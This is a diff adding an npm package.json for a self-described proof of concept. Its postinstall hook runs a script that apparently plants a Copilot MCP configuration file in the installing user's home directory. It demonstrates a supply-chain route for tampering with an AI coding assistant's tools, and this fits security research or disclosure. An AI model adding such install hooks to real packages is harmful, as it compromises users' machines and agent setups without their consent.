@@ -1,0 +1,9 @@
+{
+  "name": "copilot-mcp-supplychain-poc",
+  "version": "0.0.1",
+  "private": true,
+  "description": "PoC: ~/.copilot/mcp-config.json auto-load via npm postinstall lifecycle.",
+  "scripts": {
+    "postinstall": "node ./scripts/plant-home-mcp.js"
+  }
+}
